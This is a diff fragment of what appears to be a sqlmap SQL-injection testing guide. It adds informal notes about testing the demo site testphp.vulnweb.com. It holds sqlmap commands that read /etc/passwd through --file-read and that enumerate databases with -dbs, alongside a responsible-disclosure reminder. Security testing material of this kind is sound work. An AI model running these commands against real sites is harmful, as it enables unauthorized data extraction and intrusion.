@@ -165,3 +165,9 @@ sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd" --batch
 - **Responsible Disclosure**: If you find vulnerabilities during authorized testing, always follow responsible disclosure practices and report the issue to the website's owner or the relevant authority.
 
 how to retrieve data step to one by one
+i testing the vulnweb.php website
+
+first i used tool is sql map
+
+
+sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs
